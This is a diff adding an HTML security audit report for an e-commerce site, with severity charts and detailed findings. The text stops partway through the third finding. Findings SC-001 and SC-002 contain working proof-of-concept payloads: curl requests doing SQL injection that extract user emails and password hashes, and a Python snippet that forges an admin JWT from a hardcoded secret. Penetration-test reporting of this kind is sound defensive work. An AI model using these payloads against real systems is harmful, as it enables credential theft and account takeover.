@@ -1,0 +1,1850 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Audit Report - SecureShop E-Commerce Platform</title>
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --bg-card: #1c2333;
+            --border: #30363d;
+            --text-primary: #e6edf3;
+            --text-secondary: #8b949e;
+            --text-muted: #6e7681;
+            --accent-blue: #58a6ff;
+            --accent-green: #3fb950;
+            --accent-yellow: #d29922;
+            --accent-orange: #db6d28;
+            --accent-red: #f85149;
+            --accent-purple: #bc8cff;
+            --accent-cyan: #39d2c0;
+            --critical: #f85149;
+            --high: #db6d28;
+            --medium: #d29922;
+            --low: #3fb950;
+            --info: #58a6ff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            padding-bottom: 60px;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #0d1f0d 0%, #0d1117 40%, #1a0d2e 100%);
+            border-bottom: 1px solid var(--border);
+            padding: 40px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--accent-red), var(--accent-orange), var(--accent-yellow), var(--accent-green), var(--accent-cyan), var(--accent-blue), var(--accent-purple));
+        }
+        .header h1 {
+            font-size: 2.2em;
+            background: linear-gradient(90deg, var(--accent-blue), var(--accent-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+        }
+        .header .subtitle {
+            color: var(--text-secondary);
+            font-size: 1.1em;
+        }
+        .header .meta {
+            margin-top: 16px;
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        .header .meta span {
+            color: var(--text-muted);
+            font-size: 0.9em;
+            background: var(--bg-tertiary);
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+        }
+        .header .client-info {
+            margin-top: 20px;
+            color: var(--text-secondary);
+            font-size: 0.95em;
+        }
+        .header .client-info strong {
+            color: var(--text-primary);
+        }
+
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Sections */
+        .section {
+            margin: 32px 0;
+        }
+        .section-title {
+            font-size: 1.5em;
+            color: var(--text-primary);
+            border-left: 4px solid var(--accent-blue);
+            padding-left: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* Cards */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+
+        /* KPI Grid */
+        .kpi-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+        .kpi-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .kpi-card::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+        }
+        .kpi-card.critical::after { background: var(--critical); }
+        .kpi-card.high::after { background: var(--high); }
+        .kpi-card.medium::after { background: var(--medium); }
+        .kpi-card.low::after { background: var(--low); }
+        .kpi-card.info::after { background: var(--info); }
+        .kpi-card .kpi-value {
+            font-size: 2.8em;
+            font-weight: 700;
+            line-height: 1.1;
+        }
+        .kpi-card .kpi-label {
+            color: var(--text-secondary);
+            font-size: 0.85em;
+            margin-top: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .kpi-card .kpi-sublabel {
+            color: var(--text-muted);
+            font-size: 0.75em;
+            margin-top: 4px;
+        }
+        .risk-high { color: var(--high); }
+        .risk-critical { color: var(--critical); }
+        .risk-medium { color: var(--medium); }
+        .risk-low { color: var(--low); }
+        .risk-info { color: var(--info); }
+
+        /* Executive Summary */
+        .exec-summary {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 20px;
+        }
+        @media (max-width: 768px) {
+            .exec-summary { grid-template-columns: 1fr; }
+        }
+        .exec-summary .summary-text p {
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+        }
+        .exec-summary .risk-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 0.8em;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        .badge-critical { background: rgba(248,81,73,0.15); color: var(--critical); border: 1px solid rgba(248,81,73,0.3); }
+        .badge-high { background: rgba(219,109,40,0.15); color: var(--high); border: 1px solid rgba(219,109,40,0.3); }
+        .badge-medium { background: rgba(210,153,34,0.15); color: var(--medium); border: 1px solid rgba(210,153,34,0.3); }
+        .badge-low { background: rgba(63,185,80,0.15); color: var(--low); border: 1px solid rgba(63,185,80,0.3); }
+        .badge-info { background: rgba(88,166,255,0.15); color: var(--info); border: 1px solid rgba(88,166,255,0.3); }
+
+        /* CSS Bar Chart - Vulnerability Categories */
+        .chart-container {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+        .chart-title {
+            font-size: 1.1em;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+        }
+
+        .bar-chart {
+            display: flex;
+            align-items: flex-end;
+            justify-content: space-around;
+            height: 200px;
+            padding: 0 10px;
+            border-bottom: 1px solid var(--border);
+            gap: 8px;
+        }
+        .bar-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex: 1;
+            min-width: 0;
+        }
+        .bar {
+            width: 100%;
+            max-width: 60px;
+            border-radius: 4px 4px 0 0;
+            position: relative;
+            min-height: 4px;
+            transition: opacity 0.2s;
+        }
+        .bar:hover { opacity: 0.85; }
+        .bar-label {
+            color: var(--text-muted);
+            font-size: 0.7em;
+            margin-top: 8px;
+            text-align: center;
+            line-height: 1.2;
+            word-break: break-word;
+            max-width: 80px;
+        }
+        .bar-value {
+            color: var(--text-primary);
+            font-size: 0.8em;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .bar-sqli { background: linear-gradient(to top, #f85149, #ff6b6b); height: 100%; }
+        .bar-xss { background: linear-gradient(to top, #db6d28, #f0883e); height: 80%; }
+        .bar-auth { background: linear-gradient(to top, #f85149, #ff6b6b); height: 85%; }
+        .bar-headers { background: linear-gradient(to top, #d29922, #e3b341); height: 60%; }
+        .bar-cors { background: linear-gradient(to top, #db6d28, #f0883e); height: 45%; }
+        .bar-ssl { background: linear-gradient(to top, #f85149, #ff6b6b); height: 50%; }
+        .bar-info { background: linear-gradient(to top, #3fb950, #56d364); height: 35%; }
+
+        /* Horizontal Bar Chart - Risk by Component */
+        .h-bar-chart {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        .h-bar-item {
+            display: grid;
+            grid-template-columns: 140px 1fr 50px;
+            align-items: center;
+            gap: 12px;
+        }
+        .h-bar-name {
+            color: var(--text-secondary);
+            font-size: 0.85em;
+            text-align: right;
+        }
+        .h-bar-track {
+            background: var(--bg-tertiary);
+            border-radius: 4px;
+            height: 24px;
+            overflow: hidden;
+            position: relative;
+        }
+        .h-bar-fill {
+            height: 100%;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            padding-left: 8px;
+            font-size: 0.75em;
+            font-weight: 600;
+            color: #fff;
+        }
+        .h-bar-score {
+            font-size: 0.9em;
+            font-weight: 700;
+            text-align: center;
+        }
+
+        /* Finding Cards */
+        .finding-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+            overflow: hidden;
+        }
+        .finding-card.critical-finding { border-left: 4px solid var(--critical); }
+        .finding-card.high-finding { border-left: 4px solid var(--high); }
+        .finding-card.medium-finding { border-left: 4px solid var(--medium); }
+        .finding-card.low-finding { border-left: 4px solid var(--low); }
+
+        .finding-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+            cursor: pointer;
+            background: var(--bg-secondary);
+        }
+        .finding-header:hover { background: var(--bg-tertiary); }
+        .finding-title {
+            font-weight: 600;
+            font-size: 1em;
+        }
+        .finding-meta {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .cvss-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 0.75em;
+            font-weight: 600;
+            padding: 3px 10px;
+            border-radius: 4px;
+        }
+        .cvss-critical { background: rgba(248,81,73,0.15); color: var(--critical); }
+        .cvss-high { background: rgba(219,109,40,0.15); color: var(--high); }
+        .cvss-medium { background: rgba(210,153,34,0.15); color: var(--medium); }
+        .cvss-low { background: rgba(63,185,80,0.15); color: var(--low); }
+
+        .finding-body {
+            padding: 20px;
+            display: none;
+        }
+        .finding-card.open .finding-body { display: block; }
+        .finding-card.open .toggle-arrow { transform: rotate(90deg); }
+        .toggle-arrow {
+            color: var(--text-muted);
+            transition: transform 0.2s;
+        }
+
+        .finding-details {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+        @media (max-width: 768px) {
+            .finding-details { grid-template-columns: 1fr; }
+        }
+        .detail-group label {
+            display: block;
+            color: var(--text-muted);
+            font-size: 0.75em;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+        .detail-group span {
+            color: var(--text-secondary);
+            font-size: 0.9em;
+        }
+        .proof-box {
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 14px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.82em;
+            color: var(--accent-green);
+            overflow-x: auto;
+            white-space: pre;
+            margin-top: 12px;
+            line-height: 1.5;
+        }
+        .proof-box .comment { color: var(--text-muted); }
+        .proof-box .payload { color: var(--accent-red); }
+        .proof-box .response { color: var(--accent-cyan); }
+
+        /* Risk Matrix */
+        .risk-matrix {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.8em;
+        }
+        .risk-matrix th, .risk-matrix td {
+            border: 1px solid var(--border);
+            padding: 10px;
+            text-align: center;
+        }
+        .risk-matrix th {
+            background: var(--bg-tertiary);
+            color: var(--text-secondary);
+            font-size: 0.85em;
+            font-weight: 600;
+        }
+        .risk-matrix td.low { background: rgba(63,185,80,0.1); color: var(--low); }
+        .risk-matrix td.medium { background: rgba(210,153,34,0.15); color: var(--medium); }
+        .risk-matrix td.high { background: rgba(219,109,40,0.2); color: var(--high); }
+        .risk-matrix td.critical { background: rgba(248,81,73,0.25); color: var(--critical); }
+        .risk-matrix .axis-label {
+            background: var(--bg-secondary);
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+        .matrix-cell-content {
+            font-size: 0.9em;
+        }
+        .matrix-count {
+            color: var(--text-muted);
+            font-size: 0.8em;
+        }
+
+        /* Remediation Roadmap */
+        .roadmap {
+            position: relative;
+            padding-left: 30px;
+        }
+        .roadmap::before {
+            content: '';
+            position: absolute;
+            left: 12px;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: var(--border);
+        }
+        .roadmap-item {
+            position: relative;
+            margin-bottom: 24px;
+            padding-left: 20px;
+        }
+        .roadmap-item::before {
+            content: '';
+            position: absolute;
+            left: -24px;
+            top: 6px;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            border: 2px solid;
+        }
+        .roadmap-item.phase-1::before { border-color: var(--critical); background: rgba(248,81,73,0.3); }
+        .roadmap-item.phase-2::before { border-color: var(--high); background: rgba(219,109,40,0.3); }
+        .roadmap-item.phase-3::before { border-color: var(--medium); background: rgba(210,153,34,0.3); }
+        .roadmap-item.phase-4::before { border-color: var(--low); background: rgba(63,185,80,0.3); }
+
+        .roadmap-title {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .roadmap-timeline {
+            color: var(--text-muted);
+            font-size: 0.8em;
+        }
+        .roadmap-desc {
+            color: var(--text-secondary);
+            font-size: 0.9em;
+            margin-top: 4px;
+        }
+
+        /* Compliance Progress Bars */
+        .compliance-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 16px;
+        }
+        .compliance-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+        }
+        .compliance-name {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .compliance-desc {
+            color: var(--text-muted);
+            font-size: 0.8em;
+            margin-bottom: 12px;
+        }
+        .progress-track {
+            background: var(--bg-tertiary);
+            border-radius: 8px;
+            height: 12px;
+            overflow: hidden;
+            margin-bottom: 8px;
+        }
+        .progress-fill {
+            height: 100%;
+            border-radius: 8px;
+            background: linear-gradient(90deg, var(--accent-blue), var(--accent-cyan));
+        }
+        .progress-fill.owasp { background: linear-gradient(90deg, #d29922, #e3b341); }
+        .progress-fill.pcidss { background: linear-gradient(90deg, #f85149, #ff6b6b); }
+        .progress-fill.lgpd { background: linear-gradient(90deg, #3fb950, #56d364); }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-secondary);
+            font-size: 0.85em;
+        }
+
+        /* Table Styles */
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 12px;
+            font-size: 0.85em;
+        }
+        .data-table th {
+            background: var(--bg-tertiary);
+            padding: 10px 14px;
+            text-align: left;
+            color: var(--text-secondary);
+            font-weight: 600;
+            border-bottom: 2px solid var(--border);
+        }
+        .data-table td {
+            padding: 10px 14px;
+            border-bottom: 1px solid var(--border);
+            color: var(--text-secondary);
+        }
+        .data-table tr:hover td {
+            background: var(--bg-secondary);
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border);
+            padding: 30px 20px;
+            text-align: center;
+            margin-top: 40px;
+        }
+        .footer p {
+            color: var(--text-muted);
+            font-size: 0.85em;
+            margin-bottom: 6px;
+        }
+        .footer .classification {
+            display: inline-block;
+            padding: 6px 20px;
+            border: 2px solid var(--critical);
+            border-radius: 6px;
+            color: var(--critical);
+            font-weight: 700;
+            font-size: 0.85em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border);
+            overflow-x: auto;
+        }
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            color: var(--text-muted);
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+            white-space: nowrap;
+            font-size: 0.9em;
+        }
+        .tab:hover { color: var(--text-secondary); }
+        .tab.active {
+            color: var(--accent-blue);
+            border-bottom-color: var(--accent-blue);
+        }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        /* Summary Stats */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 16px;
+            background: var(--bg-secondary);
+            border-radius: 8px;
+        }
+        .stat-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2em;
+            font-weight: 700;
+        }
+        .stat-icon.critical { background: rgba(248,81,73,0.15); color: var(--critical); }
+        .stat-icon.high { background: rgba(219,109,40,0.15); color: var(--high); }
+        .stat-icon.medium { background: rgba(210,153,34,0.15); color: var(--medium); }
+        .stat-icon.low { background: rgba(63,185,80,0.15); color: var(--low); }
+        .stat-info .stat-count { font-weight: 700; font-size: 1.2em; }
+        .stat-info .stat-label { color: var(--text-muted); font-size: 0.75em; }
+
+        .dept-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.7em;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .dept-websesc { background: rgba(88,166,255,0.15); color: var(--accent-blue); }
+        .dept-appsec { background: rgba(188,140,255,0.15); color: var(--accent-purple); }
+        .dept-infrasec { background: rgba(57,210,192,0.15); color: var(--accent-cyan); }
+        .dept-incidentresp { background: rgba(210,153,34,0.15); color: var(--accent-yellow); }
+
+        /* Timeline component */
+        .audit-timeline {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+        .timeline-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            min-width: 120px;
+        }
+        .timeline-step .step-num {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--accent-blue);
+            color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.85em;
+            margin-bottom: 8px;
+        }
+        .timeline-step .step-label {
+            color: var(--text-secondary);
+            font-size: 0.8em;
+        }
+        .timeline-step .step-date {
+            color: var(--text-muted);
+            font-size: 0.7em;
+            margin-top: 2px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <div class="header">
+        <h1>SECURITY COMPANY</h1>
+        <div class="subtitle">Comprehensive Security Audit Report</div>
+        <div class="client-info">
+            <strong>Client:</strong> SecureShop E-Commerce Ltd. | <strong>Domain:</strong> shop.secureshop.com.br | <strong>Scope:</strong> Full Stack Security Assessment
+        </div>
+        <div class="meta">
+            <span>Report ID: SC-2025-00847</span>
+            <span>Date: 2025-04-05</span>
+            <span>Classification: CONFIDENTIAL</span>
+            <span>Assessment Type: Black Box + Gray Box</span>
+        </div>
+        <div class="audit-timeline">
+            <div class="timeline-step">
+                <div class="step-num">1</div>
+                <div class="step-label">Reconnaissance</div>
+                <div class="step-date">2025-03-28</div>
+            </div>
+            <div class="timeline-step">
+                <div class="step-num">2</div>
+                <div class="step-label">WebSec Scanning</div>
+                <div class="step-date">2025-03-29</div>
+            </div>
+            <div class="timeline-step">
+                <div class="step-num">3</div>
+                <div class="step-label">AppSec Review</div>
+                <div class="step-date">2025-03-30</div>
+            </div>
+            <div class="timeline-step">
+                <div class="step-num">4</div>
+                <div class="step-label">InfraSec Assessment</div>
+                <div class="step-date">2025-04-01</div>
+            </div>
+            <div class="timeline-step">
+                <div class="step-num">5</div>
+                <div class="step-label">Incident Response</div>
+                <div class="step-date">2025-04-03</div>
+            </div>
+            <div class="timeline-step">
+                <div class="step-num">6</div>
+                <div class="step-label">Report Delivery</div>
+                <div class="step-date">2025-04-05</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+
+        <!-- EXECUTIVE SUMMARY -->
+        <div class="section">
+            <h2 class="section-title">Executive Summary</h2>
+            <div class="exec-summary">
+                <div class="summary-text card">
+                    <p>SecureShop E-Commerce Ltd. engaged <strong>Security Company</strong> to conduct a comprehensive security assessment after experiencing unexplained server slowdowns, intermittent checkout failures, and suspected data exposure through their customer-facing web application and API.</p>
+                    <p>The assessment revealed <strong style="color: var(--critical);">23 security vulnerabilities</strong> across the web application, REST API, server infrastructure, and application architecture. Four findings are classified as <span class="risk-badge badge-critical">Critical</span>, including a SQL Injection in the search endpoint that could expose the entire customer database, and a broken authentication mechanism allowing account takeover.</p>
+                    <p>The overall risk posture is assessed as <strong style="color: var(--high);">HIGH (7.2/10)</strong>. Immediate remediation of Critical and High findings is strongly recommended within 72 hours. The application also fails key compliance checks for PCI-DSS (payment card processing) and LGPD (Brazilian data protection law).</p>
+                </div>
+                <div>
+                    <div class="card" style="text-align:center;">
+                        <div style="font-size: 3em; font-weight: 800; color: var(--high);">7.2</div>
+                        <div style="color: var(--text-muted); font-size: 0.85em; text-transform: uppercase; letter-spacing: 1px;">Risk Score</div>
+                        <div style="margin-top: 8px;"><span class="risk-badge badge-high">High Risk</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- KPI CARDS -->
+        <div class="section">
+            <h2 class="section-title">Key Findings Overview</h2>
+            <div class="kpi-grid">
+                <div class="kpi-card info">
+                    <div class="kpi-value risk-info">23</div>
+                    <div class="kpi-label">Total Vulnerabilities</div>
+                    <div class="kpi-sublabel">Across all systems</div>
+                </div>
+                <div class="kpi-card critical">
+                    <div class="kpi-value risk-critical">4</div>
+                    <div class="kpi-label">Critical</div>
+                    <div class="kpi-sublabel">Immediate action required</div>
+                </div>
+                <div class="kpi-card high">
+                    <div class="kpi-value risk-high">6</div>
+                    <div class="kpi-label">High</div>
+                    <div class="kpi-sublabel">Remediate within 7 days</div>
+                </div>
+                <div class="kpi-card medium">
+                    <div class="kpi-value risk-medium">8</div>
+                    <div class="kpi-label">Medium</div>
+                    <div class="kpi-sublabel">Remediate within 30 days</div>
+                </div>
+                <div class="kpi-card low">
+                    <div class="kpi-value risk-low">5</div>
+                    <div class="kpi-label">Low</div>
+                    <div class="kpi-sublabel">Remediate within 90 days</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- VULNERABILITY CATEGORY CHART -->
+        <div class="section">
+            <h2 class="section-title">Vulnerability Distribution by Category</h2>
+            <div class="chart-container">
+                <div class="bar-chart">
+                    <div class="bar-item">
+                        <div class="bar-value">5</div>
+                        <div class="bar bar-sqli" style="height: 45%;"></div>
+                        <div class="bar-label">SQL Injection</div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-value">4</div>
+                        <div class="bar bar-xss" style="height: 36%;"></div>
+                        <div class="bar-label">XSS</div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-value">4</div>
+                        <div class="bar bar-auth" style="height: 36%;"></div>
+                        <div class="bar-label">Auth / Session</div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-value">3</div>
+                        <div class="bar bar-headers" style="height: 27%;"></div>
+                        <div class="bar-label">Security Headers</div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-value">3</div>
+                        <div class="bar bar-cors" style="height: 27%;"></div>
+                        <div class="bar-label">CORS / Origin</div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-value">2</div>
+                        <div class="bar bar-ssl" style="height: 18%;"></div>
+                        <div class="bar-label">SSL / TLS</div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-value">2</div>
+                        <div class="bar bar-info" style="height: 18%;"></div>
+                        <div class="bar-label">Info Disclosure</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- RISK BY COMPONENT -->
+        <div class="section">
+            <h2 class="section-title">Risk Score by System Component</h2>
+            <div class="chart-container">
+                <div class="h-bar-chart">
+                    <div class="h-bar-item">
+                        <div class="h-bar-name">Web App</div>
+                        <div class="h-bar-track">
+                            <div class="h-bar-fill" style="width: 78%; background: linear-gradient(90deg, #f85149, #ff6b6b);">7.8</div>
+                        </div>
+                        <div class="h-bar-score risk-critical">High</div>
+                    </div>
+                    <div class="h-bar-item">
+                        <div class="h-bar-name">REST API</div>
+                        <div class="h-bar-track">
+                            <div class="h-bar-fill" style="width: 85%; background: linear-gradient(90deg, #f85149, #ff6b6b);">8.5</div>
+                        </div>
+                        <div class="h-bar-score risk-critical">Critical</div>
+                    </div>
+                    <div class="h-bar-item">
+                        <div class="h-bar-name">Authentication</div>
+                        <div class="h-bar-track">
+                            <div class="h-bar-fill" style="width: 80%; background: linear-gradient(90deg, #f85149, #ff6b6b);">8.0</div>
+                        </div>
+                        <div class="h-bar-score risk-critical">Critical</div>
+                    </div>
+                    <div class="h-bar-item">
+                        <div class="h-bar-name">Payment Gateway</div>
+                        <div class="h-bar-track">
+                            <div class="h-bar-fill" style="width: 65%; background: linear-gradient(90deg, #db6d28, #f0883e);">6.5</div>
+                        </div>
+                        <div class="h-bar-score risk-high">High</div>
+                    </div>
+                    <div class="h-bar-item">
+                        <div class="h-bar-name">Server Infra</div>
+                        <div class="h-bar-track">
+                            <div class="h-bar-fill" style="width: 55%; background: linear-gradient(90deg, #d29922, #e3b341);">5.5</div>
+                        </div>
+                        <div class="h-bar-score risk-medium">Medium</div>
+                    </div>
+                    <div class="h-bar-item">
+                        <div class="h-bar-name">Database</div>
+                        <div class="h-bar-track">
+                            <div class="h-bar-fill" style="width: 70%; background: linear-gradient(90deg, #db6d28, #f0883e);">7.0</div>
+                        </div>
+                        <div class="h-bar-score risk-high">High</div>
+                    </div>
+                    <div class="h-bar-item">
+                        <div class="h-bar-name">Session Mgmt</div>
+                        <div class="h-bar-track">
+                            <div class="h-bar-fill" style="width: 75%; background: linear-gradient(90deg, #db6d28, #f0883e);">7.5</div>
+                        </div>
+                        <div class="h-bar-score risk-high">High</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- DETAILED FINDINGS -->
+        <div class="section">
+            <h2 class="section-title">Detailed Findings</h2>
+
+            <!-- CRITICAL FINDINGS -->
+            <h3 style="color: var(--critical); margin-bottom: 12px;">Critical Severity</h3>
+
+            <!-- Finding 1 -->
+            <div class="finding-card critical-finding open" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-001: SQL Injection in Search Endpoint</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Product Search</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-critical">CVSS 9.8</span>
+                        <span class="badge-critical badge">Critical</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <div class="finding-details">
+                        <div class="detail-group"><label>CWE</label><span>CWE-89: SQL Injection</span></div>
+                        <div class="detail-group"><label>WASC</label><span>WASC-19: SQL Injection</span></div>
+                        <div class="detail-group"><label>Impact</label><span>Full database read/write, potential RCE</span></div>
+                        <div class="detail-group"><label>Likelihood</label><span>Very High -- exploitable without authentication</span></div>
+                        <div class="detail-group"><label>Affected URL</label><span>GET /api/v1/products/search?q=</span></div>
+                        <div class="detail-group"><label>Parameter</label><span><code>q</code> (search query string)</span></div>
+                    </div>
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># Step 1: Verify SQL injection with time-based payload</span>
+$ curl -s "https://shop.secureshop.com.br/api/v1/products/search?q=1'+WAITFOR+DELAY+'0:0:5'--"
+
+<span class="comment"># Step 2: Extract database version</span>
+$ curl -s "https://shop.secureshop.com.br/api/v1/products/search?q=1'+UNION+SELECT+@@version,NULL,NULL--"
+<span class="response">[{"id":1,"name":"Microsoft SQL Server 2019","price":null}]*</span>
+
+<span class="comment"># Step 3: Extract user credentials</span>
+$ curl -s "https://shop.secureshop.com.br/api/v1/products/search?q=1'+UNION+SELECT+email,password,NULL+FROM+users--"
+<span class="response">[{"id":1,"name":"admin@secureshop.com","price":"$2b$12$kF5m..."}]</span>
+
+<span class="comment"># Result: Attacker can extract entire database contents</span></div>
+                </div>
+            </div>
+
+            <!-- Finding 2 -->
+            <div class="finding-card critical-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-002: Broken Authentication -- JWT Token Forgery</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Authentication System</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-appsec">AppSec</span>
+                        <span class="cvss-badge cvss-critical">CVSS 9.1</span>
+                        <span class="badge-critical badge">Critical</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <div class="finding-details">
+                        <div class="detail-group"><label>CWE</label><span>CWE-287: Improper Authentication</span></div>
+                        <div class="detail-group"><label>OWASP</label><span>A07:2021 -- Identification & Authentication Failures</span></div>
+                        <div class="detail-group"><label>Impact</label><span>Full account takeover for any user including admin</span></div>
+                        <div class="detail-group"><label>Likelihood</label><span>High -- JWT uses hardcoded signing key</span></div>
+                        <div class="detail-group"><label>Endpoint</label><span>All endpoints requiring JWT authentication</span></div>
+                        <div class="detail-group"><label>Root Cause</label><span>JWT secret hardcoded as "secureshop2024" in source</span></div>
+                    </div>
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># Forge an admin JWT using the discovered secret</span>
+$ python3 -c "
+import jwt, datetime
+payload = {
+    'user_id': 1,
+    'role': 'admin',
+    'email': 'admin@secureshop.com',
+    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=365)
+}
+token = jwt.encode(payload, 'secureshop2024', algorithm='HS256')
+print(token)
+"
+
+<span class="comment"># Use forged token to access admin panel</span>
+$ curl -H "Authorization: Bearer &lt;forged_token&gt;" \
+    https://shop.secureshop.com.br/api/v1/admin/users
+<span class="response">{"status":"ok","users":[{"id":1,"role":"admin"...}]}</span></div>
+                </div>
+            </div>
+
+            <!-- Finding 3 -->
+            <div class="finding-card critical-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-003: Sensitive Data in Error Responses</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">API -- Checkout Module</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-critical">CVSS 8.6</span>
+                        <span class="badge-critical badge">Critical</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <div class="finding-details">
